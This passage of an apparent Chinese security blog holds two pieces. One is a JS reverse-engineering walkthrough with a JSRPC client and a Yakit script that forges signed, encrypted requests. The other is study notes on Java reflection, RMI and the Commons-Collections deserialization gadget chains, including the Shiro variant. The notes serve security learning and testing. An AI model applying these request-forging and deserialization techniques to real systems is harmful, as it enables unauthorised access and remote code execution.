class="hljs-property">socket</span>.<span class="hljs-property">onmessage</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) &#123;<br>            _this.<span class="hljs-title function_">handlerRequest</span>(e.<span class="hljs-property">data</span>)<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;connection failed,reconnect after 10s&quot;</span>);<br>        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>            _this.<span class="hljs-title function_">connect</span>()<br>        &#125;, <span class="hljs-number">10000</span>)<br>    &#125;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">socket</span>.<span class="hljs-property">onclose</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;rpc已关闭&#x27;</span>);<br>        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>            _this.<span class="hljs-title function_">connect</span>()<br>        &#125;, <span class="hljs-number">10000</span>)<br>    &#125;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">socket</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;rpc连接成功&quot;</span>);<br>    &#125;);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">socket</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;rpc连接出错,请检查是否打开服务端:&#x27;</span>, event.<span class="hljs-property">error</span>);<br>    &#125;);<br><br>&#125;;<br><span class="hljs-title class_">Hlclient</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">send</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">msg</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">socket</span>.<span class="hljs-title function_">send</span>(msg)<br>&#125;<br><br><span class="hljs-title class_">Hlclient</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">regAction</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">func_name, func</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> func_name !== <span class="hljs-string">&#x27;string&#x27;</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;an func_name must be string&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> func !== <span class="hljs-string">&#x27;function&#x27;</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;must be function&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;register func_name: &quot;</span> + func_name);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">handlers</span>[func_name] = func;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br><br>&#125;<br><br><span class="hljs-comment">//收到消息后这里处理，</span><br><span class="hljs-title class_">Hlclient</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">handlerRequest</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">requestJson</span>) &#123;<br>    <span class="hljs-keyword">var</span> _this = <span class="hljs-variable language_">this</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">var</span> result = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(requestJson)<br>    &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;请求信息解析错误&quot;</span>, requestJson);<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (!result[<span class="hljs-string">&#x27;action&#x27;</span>] || !result[<span class="hljs-string">&quot;message_id&quot;</span>]) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">&#x27;没有方法或者消息id,不处理&#x27;</span>);<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-keyword">var</span> action = result[<span class="hljs-string">&quot;action&quot;</span>], message_id = result[<span class="hljs-string">&quot;message_id&quot;</span>]<br>    <span class="hljs-keyword">var</span> theHandler = <span class="hljs-variable language_">this</span>.<span class="hljs-property">handlers</span>[action];<br>    <span class="hljs-keyword">if</span> (!theHandler) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">sendResult</span>(action, message_id, <span class="hljs-string">&#x27;action没找到&#x27;</span>);<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span> (!result[<span class="hljs-string">&quot;param&quot;</span>]) &#123;<br>            <span class="hljs-title function_">theHandler</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">response</span>) &#123;<br>                _this.<span class="hljs-title function_">sendResult</span>(action, message_id, response);<br>            &#125;)<br>            <span class="hljs-keyword">return</span><br>        &#125;<br>        <span class="hljs-keyword">var</span> param = result[<span class="hljs-string">&quot;param&quot;</span>]<br>        <span class="hljs-keyword">try</span> &#123;<br>            param = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(param)<br>        &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        &#125;<br>        <span class="hljs-title function_">theHandler</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">response</span>) &#123;<br>            _this.<span class="hljs-title function_">sendResult</span>(action, message_id, response);<br>        &#125;, param)<br><br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;error: &quot;</span> + e);<br>        _this.<span class="hljs-title function_">sendResult</span>(action, message_id, e);<br>    &#125;<br>&#125;<br><br><span class="hljs-title class_">Hlclient</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sendResult</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">action, message_id, e</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> e === <span class="hljs-string">&#x27;object&#x27;</span> &amp;&amp; e !== <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            e = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(e)<br>        &#125; <span class="hljs-keyword">catch</span> (v) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(v)<span class="hljs-comment">//不是json无需操作</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<span class="hljs-string">&quot;action&quot;</span>: action, <span class="hljs-string">&quot;message_id&quot;</span>: message_id, <span class="hljs-string">&quot;response_data&quot;</span>: e&#125;));<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">var</span> demo = <span class="hljs-keyword">new</span> <span class="hljs-type">Hlclient</span>(<span class="hljs-string">&quot;ws://127.0.0.1:12080/ws?group=zzz&quot;</span>);<br></code></pre></td></tr></table></figure><img src="/2025/01/07/js%E9%80%86%E5%90%91/image-20250107165359349.png" class="" title="image-20250107165359349"><p>先调试 然后注册加密函数</p><img src="/2025/01/07/js%E9%80%86%E5%90%91/image-20250107170018233.png" class="" title="image-20250107170018233"><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">window.enc=l<br>demo.reg<span class="hljs-constructor">Action(<span class="hljs-string">&quot;enc&quot;</span>, <span class="hljs-params">function</span> (<span class="hljs-params">resolve</span>, <span class="hljs-params">param</span>)</span> &#123;<br>    var res = enc(<span class="hljs-constructor">String(<span class="hljs-params">param</span>)</span>);<br>    resolve(res);<br>&#125;)<br></code></pre></td></tr></table></figure><p>成功调用接口</p><p>避坑：加密函数l要在调试的时候加入全局函数，退出调试再调用rpc接口，小心油猴影响脚本使用</p><img src="/2025/01/07/js%E9%80%86%E5%90%91/image-20250107203636328.png" class="" title="image-20250107203636328"><h1 id="yakit-rpc"><a href="#yakit-rpc" class="headerlink" title="yakit+rpc"></a>yakit+rpc</h1><p>要完成完整的改包操作 首先要根据源码</p><img src="/2025/01/07/js%E9%80%86%E5%90%91/image-20250107205018348.png" class="" title="image-20250107205018348"><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">//时间戳</span><br>window<span class="hljs-selector-class">.time</span> = Date<span class="hljs-selector-class">.parse</span><br><span class="hljs-comment">//requestId</span><br>window<span class="hljs-selector-class">.id</span> = <span class="hljs-selector-tag">p</span><br><span class="hljs-comment">//v函数</span><br>window<span class="hljs-selector-class">.v1</span> = v<br><span class="hljs-comment">//签名</span><br>window<span class="hljs-selector-class">.m</span> = <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.MD5</span><br><span class="hljs-comment">//加密</span><br>window<span class="hljs-selector-class">.enc</span> = l<br></code></pre></td></tr></table></figure><p>注册</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//md5函数</span><br>demo.reg<span class="hljs-constructor">Action(<span class="hljs-string">&quot;req&quot;</span>, <span class="hljs-params">function</span> (<span class="hljs-params">resolve</span>,<span class="hljs-params">param</span>)</span> &#123;<br>    <span class="hljs-comment">//请求头</span><br>    <span class="hljs-keyword">let</span> timestamp = time(<span class="hljs-keyword">new</span> <span class="hljs-constructor">Date()</span>);<br>    <span class="hljs-keyword">let</span> requestid = id<span class="hljs-literal">()</span>;<br>    <span class="hljs-keyword">let</span> v_data = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JSON</span>.</span></span>stringify(v1(param));<br>    <span class="hljs-keyword">let</span> sign = m(v_data + requestid + timestamp).<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>;<br>    <span class="hljs-comment">//加密请求体</span><br>    <span class="hljs-keyword">let</span> encstr = enc(v_data);<br><br>    <span class="hljs-keyword">let</span> res = &#123;<br>        <span class="hljs-string">&quot;timestamp&quot;</span>:timestamp,<br>        <span class="hljs-string">&quot;requestid&quot;</span>:requestid,<br>        <span class="hljs-string">&quot;encstr&quot;</span>:encstr,<br>        <span class="hljs-string">&quot;sign&quot;</span>:sign<br>    &#125;;<br>    resolve(res);<br>&#125;)<br></code></pre></td></tr></table></figure><p>输出一下原始输入</p><img src="/2025/01/07/js%E9%80%86%E5%90%91/image-20250107205759376.png" class="" title="image-20250107205759376"><img src="/2025/01/07/js%E9%80%86%E5%90%91/image-20250107210640368.png" class="" title="image-20250107210640368"><p>成功伪造 接下来用yakit</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">// 定义加密函数</span><br>func <span class="hljs-built_in">getEnc</span>(data)&#123;<br>    rsp,req,err = poc<span class="hljs-selector-class">.Post</span>(<span class="hljs-string">&quot;http://127.0.0.1:12080/go&quot;</span>,poc<span class="hljs-selector-class">.replaceBody</span>(<span class="hljs-string">&quot;group=zzz&amp;action=enc&amp;param=&quot;</span>+data, false),poc<span class="hljs-selector-class">.appendHeader</span>(<span class="hljs-string">&quot;content-type&quot;</span>, <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>))<br>    <span class="hljs-built_in">if</span>(err)&#123;<br>        <span class="hljs-built_in">return</span>(err)<br>    &#125;<br><br>    return json<span class="hljs-selector-class">.loads</span>(rsp<span class="hljs-selector-class">.GetBody</span>())<span class="hljs-selector-attr">[<span class="hljs-string">&quot;data&quot;</span>]</span><br>&#125;<br><br><span class="hljs-comment">// beforeRequest 允许发送数据包前再做一次处理，定义为 func(origin []byte) []byte</span><br>beforeRequest = <span class="hljs-built_in">func</span>(req) &#123;<br>    <span class="hljs-comment">//获取请求体</span><br>    req_body = poc<span class="hljs-selector-class">.GetHTTPPacketBody</span>(req)<br>    <span class="hljs-comment">//加密</span><br>    res = <span class="hljs-built_in">getEnc</span>(<span class="hljs-built_in">string</span>(req_body))<br>    <span class="hljs-comment">//获取其他的参数</span><br>    res = json<span class="hljs-selector-class">.loads</span>(res)<br><br>    <span class="hljs-comment">//修改其他的请求头</span><br>    req = poc<span class="hljs-selector-class">.ReplaceHTTPPacketHeader</span>(req, <span class="hljs-string">&quot;requestId&quot;</span>, res<span class="hljs-selector-attr">[<span class="hljs-string">&quot;requestid&quot;</span>]</span>)<br>    req = poc<span class="hljs-selector-class">.ReplaceHTTPPacketHeader</span>(req, <span class="hljs-string">&quot;timestamp&quot;</span>, res<span class="hljs-selector-attr">[<span class="hljs-string">&quot;timestamp&quot;</span>]</span>)<br>    req = poc<span class="hljs-selector-class">.ReplaceHTTPPacketHeader</span>(req, <span class="hljs-string">&quot;sign&quot;</span>, res<span class="hljs-selector-attr">[<span class="hljs-string">&quot;sign&quot;</span>]</span>)<br><br>    <span class="hljs-comment">//修改请求体</span><br>    req = poc<span class="hljs-selector-class">.ReplaceHTTPPacketBody</span>(req, res<span class="hljs-selector-attr">[<span class="hljs-string">&quot;encstr&quot;</span>]</span>)<br><br><br>    return <span class="hljs-selector-attr">[]</span><span class="hljs-built_in">byte</span>(req)<br>&#125;<br><br><span class="hljs-comment">// afterRequest 允许对每一个请求的响应做处理，定义为 func(origin []byte) []byte</span><br>afterRequest = <span class="hljs-built_in">func</span>(rsp) &#123;<br>    return <span class="hljs-selector-attr">[]</span><span class="hljs-built_in">byte</span>(rsp)<br>&#125;<br><br><span class="hljs-comment">// mirrorHTTPFlow 允许对每一个请求的响应做处理，定义为 func(req []byte, rsp []byte, params map[string]any) map[string]any</span><br><span class="hljs-comment">// 返回值回作为下一个请求的参数，或者提取的数据，如果你需要解密响应内容，在这里操作是最合适的</span><br>mirrorHTTPFlow = <span class="hljs-built_in">func</span>(req, rsp, params) &#123;<br>    return params<br>&#125;<br></code></pre></td></tr></table></figure><p>解读一下 其实就是未加密请求的body，通过rpc接口返回加密后的数据（抓取data解析，看了访问rpc接口的页面就懂了）</p>]]></content>
    
    
    <categories>
      
      <category>js逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>js逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java安全</title>
    <link href="/2024/12/30/java%E5%AE%89%E5%85%A8/"/>
    <url>/2024/12/30/java%E5%AE%89%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><p>反射关键四个点</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822160244640.png" class="" title="image-20240822160244640"><h2 id="获取类"><a href="#获取类" class="headerlink" title="获取类"></a>获取类</h2><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822160259463.png" class="" title="image-20240822160259463"><p>getclass：存在实例，获取类</p><p>class：传入类，只获取class对象</p><p>forname：通过名字获取类</p><h2 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h2><p>若c1类中编写c2类，则编译的时候会构造出c1$c2.class</p><p>同时forClass获取内部类也是用$</p><h2 id="可变长函数"><a href="#可变长函数" class="headerlink" title="可变长函数"></a>可变长函数</h2><p>在java底层都相当于数组</p><h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><ul><li>ClassLoader</li><li>需要代理的对象</li><li>实现了InvocationHandler接口的对象（实现）</li></ul><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240828171025858.png" class="" title="image-20240828171025858"><h1 id="反射函数"><a href="#反射函数" class="headerlink" title="反射函数"></a>反射函数</h1><h2 id="forName"><a href="#forName" class="headerlink" title="forName"></a>forName</h2><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822160331491.png" class="" title="image-20240822160331491"><p>当forName函数第二个参数为ture的时候，会进行<strong>类初始化</strong></p><p>如下代码先执行static 最后执行构造函数</p><p><strong>static {} 就是在“类初始化”的时候调⽤的，⽽ {} 中的代码会放在构造函数的 super() 后⾯，但在当前构造函数内容的前⾯</strong></p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822162510500.png" class="" title="image-20240822162510500"><p>那么，若有函数</p><img src="java安全/image-20240822162938175.png" alt="image-20240822162938175" style="zoom:150%;" /><p>则可以已通过构造一个恶意类，使它的static函数被虚拟机类初始化时能够getshell</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822163017563.png" class="" title="image-20240822163017563"><h2 id="newInstance"><a href="#newInstance" class="headerlink" title="newInstance"></a>newInstance</h2><p>调用<strong>无参构造</strong>，或者在<strong>构造器上面调用构造函数</strong></p><ul><li><p>无参构造函数</p></li><li><p>方法不能私有</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822163506590.png" class="" title="image-20240822163506590"></li></ul><p>如上 Runtime类构造函数私有，报错</p><p>（单例模式：对于Web应用来说，数据库连接只需要建立一次，开发者可以将数据库连接使用的类的构造函数设置为私有，然后编写一个<strong>静态方法</strong>来获取）</p><p>则换成Runtime.getRuntime()获取对象</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822163912568.png" class="" title="image-20240822163912568"><h2 id="getMethod"><a href="#getMethod" class="headerlink" title="getMethod"></a>getMethod</h2><p><strong>获取类的公有方法</strong>，由于java支持<strong>重载</strong>，则需要传入两个参数</p><ul><li>函数名</li><li>参数列表</li></ul><p>例如<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822164616752.png" class="" title="image-20240822164616752"></p><h2 id="invoke"><a href="#invoke" class="headerlink" title="invoke"></a>invoke</h2><p>执行方法 ，第一个参数</p><ul><li>普通方法，传入对象</li><li>静态方法，传入类</li></ul><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822164833930.png" class="" title="image-20240822164833930"><p>第二个参数是传入方法的参数</p><p>综上所述，</p><p>获取类，获取方法</p><p>利用获取的<strong>静态方法</strong>传入类调用构造函数，<strong>得到对象</strong>，然后invoke调用方法</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822164847406.png" class="" title="image-20240822164847406"><h2 id="getConstructor"><a href="#getConstructor" class="headerlink" title="getConstructor"></a>getConstructor</h2><p><strong>没有无参构造，也没静态调用构造</strong></p><p>接受构造函数列表类型，返回引用了该构造函数的<code>java.lang.reflect.Constructor</code> 对象，然后用newinstance将他实例化</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822171051720.png" class="" title="image-20240822171051720"><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822171141413.png" class="" title="image-20240822171141413"><p>想调用ProcessBuilder第二个构造函数的时候由于是<strong>变长参数</strong>，又因为newInstance函数本身接收的是一个可变长参数，则传入一个二维数组</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822171345448.png" class="" title="image-20240822171345448"><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822171356276.png" class=""><h2 id="getDeclared"><a href="#getDeclared" class="headerlink" title="getDeclared"></a>getDeclared</h2><ul><li>私有方法调用</li><li>不继承父类</li><li>需要setAccessible（ture）</li></ul><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822172503581.png" class="" title="image-20240822172503581"><h2 id="getRuntime"><a href="#getRuntime" class="headerlink" title="getRuntime"></a>getRuntime</h2><p>Runtime类中的<strong>静态方法</strong>，可以省略实例化的过程，invoke直接放入一个类即可，如果不使用它则需要通过getConstructor来实例化对象</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>由于Runtime类不可直接序列化，所以通过Class类以及强转得到</p><p>首先获取class原型对象（可序列化）</p><p>然后通过getMethod获取了getRuntime和exec方法</p><p>通过invoke调用getRuntime方法来获取runtime对象，然后同样调用exec方法</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240901162528221.png" class="" title="image-20240901162528221"><h1 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h1><h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822173252630.png" class="" title="image-20240822173252630"><p>如下</p><ul><li>继承Remote并且定义函数的接口</li><li>实现此接口的类</li><li>实例化上面的类后绑定，创建Registry</li></ul><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822173907101.png" class="" title="image-20240822173907101"><p>LocateRegistry.createRegistry(1099);创建了Registry</p><p>Naming.bind绑定到将一个对象和一个名字（hello）绑定在一起</p><p>客户端</p><p>利用接口，Naming.loockup查找并且创建对象</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822174134316.png" class="" title="image-20240822174134316"><blockquote><p>RMI Registry就像⼀个⽹关，他⾃⼰是不会执⾏远程⽅法的，但RMI Server可以在上⾯注册⼀个Name</p><p>到对象的绑定关系；RMI Client通过Name向RMI Registry查询，得到这个绑定关系，然后再连接RMI</p><p>Server；最后，远程⽅法实际上在RMI Server上调⽤。</p></blockquote><p>tcp连接两次，第一次根据绑定的ip查询Registry，第二次接受序列化数据，反序列化后得到目标ip和端口</p><h2 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h2><p>Naming下的list和lookup方法</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822175023452.png" class="" title="image-20240822175023452"><p>此处还存在一个codebase漏洞，反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类；如果在本地没有找到这个类，就会去远程加载codebase中的类。</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822180338801.png" class="" title="image-20240822180338801"><h1 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget</h1><h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">调用AnnotationInvocationHandler#invoke去调用lazymap#get最后到达transform方法<br></code></pre></td></tr></table></figure><p><strong>在Java 8u71以后的版本AnnotationInvocationHandler新建了一个LinkedHashMap对象，并将原来的键值添加进去，导致CC1 CC3不可用</strong></p><ul><li><p>Runtime是内置类，需要获取.class后getMethod获取getRuntime方法</p></li><li><p>TransformedMap用来修饰一个map，map被修改键值的时候会回调，所以构造outputMap，被修改键值的时候触发ChainsfromedMap</p></li><li><p>AnnotationInvocationHandler类构造方法私有，需要反射获取，它的价值是修改map的键值，代替了demo中的put</p></li><li><p>关于AnnotationInvocationHandler类的构造<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240823100429772.png" class="" title="image-20240823100429772"></p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240823100704819.png" class="" title="image-20240823100704819"><p>所以构造的时候传入了Rentention类，这个类有一个value方法，所以给innerMap传入一个value键</p></li><li><p>lazymap：链子中代替了transformMap，他的<strong>get方法找不到参数的时候会调用transfrom</strong>，很巧的是可以利用动态代理调用<strong>AnnotationInvocationHandler#invoke去调用lazymap#get</strong></p></li><li><p>AnnotationInvocationHandler#readObject中的value被设置，但是可以用<strong>constanTransformer来绕过，强制返回一个Runtime.class</strong></p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240901172435852.png" class="" title="image-20240901172435852"></li></ul><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240904192620272.png" class="" title="image-20240904192620272"><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240904192654165.png" class="" title="image-20240904192654165"><p>AnnotationInvocationHandler#readObject–&gt;lazymap#get–&gt;transfrom</p><h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">通过InstantiateTransformer调用TrAXFilter的构造方法最后调用templates.<span class="hljs-keyword">new</span><span class="hljs-type">Transformer</span>（）来动态加载字节码<br></code></pre></td></tr></table></figure><p>同cc1，限制于8u71</p><p><strong>绕过了InvokerTransformer</strong></p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240828172948549.png" class="" title="image-20240828172948549"><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240828173210827.png" class="" title="image-20240828173210827"><p>注意！下图的transformers未修改</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240831200350179.png" class="" title="image-20240831200350179"><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240831200402681.png" class="" title="image-20240831200402681"><h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">HashMap#readObject --&gt;  hash(key)  --&gt;  key.hashCode (TiedMapEntry#hashCode) -- &gt; TiedMapEntry#getValue --&gt; this.map.get (LazyMap#get)<br></code></pre></td></tr></table></figure><p>为了解决sun.reflect.annotation.AnnotationInvocationHandler#readObject在8u71后的变化</p><p>又回到了如何调用<strong>LazyMap#get</strong>的问题，这里利用了<strong>TiedMapEntry</strong></p><blockquote><p>TiedMapEntry的构造函数传入一个map和一个key，他的getValue方法调用的了map的get方法并且传入</p><p>key</p></blockquote><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830025106763.png" class="" title="image-20240830025106763"><p>同时，直接构造的话会让最后的get进不去，outputMap会多上一个键，需要手动remove</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830031951647.png" class="" title="image-20240830031951647"><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240831200132535.png" class="" title="image-20240831200132535"><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240831200150705.png" class="" title="image-20240831200150705"><h2 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">利用BadAttributeValueExpException#readObject调用到TiedMapEntry#toString--&gt;TiedMapEntry#getValue--&gt;LazyMap#get<br></code></pre></td></tr></table></figure><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240902161811190.png" class="" title="image-20240902161811190"><h2 id="CC-shiro"><a href="#CC-shiro" class="headerlink" title="CC shiro"></a>CC shiro</h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs clean">通过CC6调用到TiedMapEntry#getValue--&gt;this.map#get--&gt;transfrom(key)<br>CC6直接打LazyMap#get,这里利用TempLatesImpl<br>构造key为一个恶意TempLatesImpl对象，然后invokeTransformer传入newTransformer方法<br></code></pre></td></tr></table></figure><p>shiro在链子中存在数组会报错</p><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830024138826.png" class="" title="image-20240830024138826"><p>首先，从动态加载字节码的知识可知，我们可以如上构造exp</p><img 